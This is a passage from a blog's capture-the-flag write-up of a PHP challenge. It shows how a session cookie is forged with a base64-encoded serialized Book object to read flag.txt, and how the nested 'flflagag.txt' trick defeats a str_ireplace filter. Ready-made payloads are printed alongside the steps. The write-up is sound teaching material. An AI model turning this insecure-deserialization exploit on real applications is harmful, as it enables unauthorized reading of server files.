+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">)));</span>
+</span></span></code></pre></div><p>So, we need to encode it through <code>base64_encode(serialize(&lt;new_username&gt;))</code>. How about let&rsquo;s try encode the value &lsquo;hi&rsquo; as our username.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="s1">&#39;hi&#39;</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Output: czoyOiJoaSI7
+</span></span></span></code></pre></div><p>Changing our PHPSESSID cookie to the output, we get &lsquo;hi&rsquo; displayed as our username!</p>
+<img src="assets/libwary (4).png">
+<p>So, how can we exploit this to obtain the flag?</p>
+<br>
+<h3 id="php-insecure-deserialization">PHP Insecure Deserialization</h3>
+<p>Considering we can control PHPSESSID to display whatever we want, how if we serialize an object with the class <code>Book</code>?</p>
+<ul>
+<li>Remember that serialization maintains the type and structure of the object!</li>
+</ul>
+<p>The class <code>Book</code> will return the content of the file when printed (as per its <code>__toString</code> method).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="fm">__tostring</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//final defence
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">!=</span> <span class="s2">&#34;fakeflag.txt&#34;</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//read the file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;books/&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//make it look nicer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>So, when it undergoes the following code, if <code>$user</code> is an object with the class <code>Book</code>, it would return the contents of its file!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span> Welcome to the Libwary™,  
+</span></span><span class="line"><span class="cl">    <span class="cp">&lt;?php 
+</span></span></span><span class="line"><span class="cl"><span class="cp">        echo $user;
+</span></span></span><span class="line"><span class="cl"><span class="cp">    ?&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- this will return the contents of the file selected,
+</span></span></span><span class="line"><span class="cl"><span class="c">    if the variable $user is an object of class Book--&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>This is a potential vulnerability we can make use to print the contents &ldquo;flag.txt&rdquo;. We just need to serialize an object with the class <code>Book</code>, but make <code>$name = 'flag.txt'</code>.</p>
+<br>
+<h3 id="getting-flagtxt">Getting flag.txt</h3>
+<p>We can simulate creating an object with the <code>Book</code> class by simply copy pasting the class and its variables from <code>util.php</code> to our own php compiler (or use <a href="https://onlinephp.io/">this</a> online sandbox).</p>
+<p>We can then simply proceed to encode this object via the abovementioned serialization procedure.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Book</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$option</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Book</span><span class="p">())));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// we can serialize a Book object this way to then put into the cookie
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>Since we did not include a <code>__construct</code> method here, the value of <code>$option</code> doesn&rsquo;t determine the value of <code>$name</code>.</p>
+<ul>
+<li>When we serialize the <code>$Book</code> object ourselves, the values that are stored are 1) the class name and 2) its variables (ie <code>$option</code>,<code>$name</code>). The methods (eg <code>__construct</code>) will NOT be saved</li>
+</ul>
+<p>So, why don&rsquo;t we just fix <code>$name</code> to &ldquo;flag.txt&rdquo; by ourselves?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Book</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$option</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;flag.txt&#34;</span><span class="p">;</span> <span class="c1">//fix $name to flag.txt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Book</span><span class="p">())));</span> <span class="c1">// serialize the Book object
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Output: Tzo0OiJCb29rIjozOntzOjY6Im9wdGlvbiI7TjtzOjQ6Im5hbWUiO3M6ODoiZmxhZy50eHQiO3M6NzoiY29udGVudCI7Tjt9
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>As such, we have successfully encoded an object which has <code>$name = &quot;flag.txt&quot;</code>.</p>
+<p>However, this still wouldn&rsquo;t work due to the final defence in <code>__tostring</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="fm">__tostring</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//final defence [it will remove all occurrences of &#34;flag&#34; in $name]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">!=</span> <span class="s2">&#34;fakeflag.txt&#34;</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//read the file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;books/&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//make it look nicer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>As such, when printing the object, <code>$name</code> will become <code>&quot;.txt&quot;</code> which leads to an error.</p>
+<br>
+<h3 id="bypassing-the-final-defence">Bypassing the final defence</h3>
+<p>I went to google around for some bypasses of <code>str_ireplace</code> when I passed by <a href="https://www.sevenlayers.com/index.php/blog/398-hackmyvm-connection-walkthrough">this</a> article.</p>
+<figure>
+    <img src="assets/libwary (5).png" width=70%>
+  <figcaption style="text-align:center">A screenshot from the website.</figcaption>
+</figure>
+<p>In the case of this image, the filtered terms are <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code>. To bypass the filter, the author embeds <code>&lt;script&gt;</code> in the middle of a <code>&lt;scr</code> and <code>ipt&gt;</code>, forming <code>&lt;scr&lt;script&gt;ipt&gt;</code>.</p>
+<p>The filter will remove the <code>&lt;script&gt;</code> in the middle, which combines the <code>&lt;scr</code> and <code>ipt&gt;</code> fragments to form the filtered term!</p>
+<br>
+<p>Applying this, what we need to do is to put <code>$name = &quot;flflagag.txt&quot;</code>. This way, when the middle <code>&quot;flag&quot;</code> is removed, the 2 fragments at the side will form <code>&quot;flag.txt&quot;</code>!</p>
+<p>Let&rsquo;s create a serialized <code>Book</code> object, this time with <code>$name = &quot;flflagag.txt&quot;</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Book</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$option</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;flflagag.txt&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Book</span><span class="p">())));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Output: Tzo0OiJCb29rIjozOntzOjY6Im9wdGlvbiI7TjtzOjQ6Im5hbWUiO3M6MTI6ImZsZmxhZ2FnLnR4dCI7czo3OiJjb250ZW50IjtOO30=
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>Let&rsquo;s change out cookie to the output. Reloading the page, we get the flag displayed at the location of the username.</p>
+<img src="assets/libwary (6).png">
+<p>Flag: <code>ACSI{0mg_th4nks_f0r_r3ading!} </code></p>
+
+      </div>
+      <br>
+    </article>
+
+    <hr />
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://enxgmatic.github.io/blog/pwntools-cheatsheet/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">Pwntools Cheatsheet</span>
+                </a>
+            </span>
+            
+
+            
+        </div>
+    </div>
+
+
+    <div id="comments" class="thin"></div>
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer id="site-footer" class="section-inner thin animated fadeIn faster footer">
+	<p>
+		&copy; 2025 enxgmatic
+		
+		&#183; Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>
+		&#183; Theme <a href="https://github.com/1bl4z3r/hermit-V2" target="_blank" rel="noopener">Hello Friend NG</a>
+		
+		
+		
+	</p>
+
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.5dec718db360369f6c53d6a74eb9396d4a6ae9407b4857a7d7a02fc1a475bc7264af31658e86eeef5799dacd109c6b4bcae61c64772423ae9ef2ee502bf8d8ec.js" integrity="sha512-XexxjbNgNp9sU9anTrk5bUpq6UB7SFen16AvwaR1vHJkrzFljobu71eZ2s0QnGtLyuYcZHckI66e8u5QK/jY7A=="></script>
+
+
+
+
+    </body>
+</html>
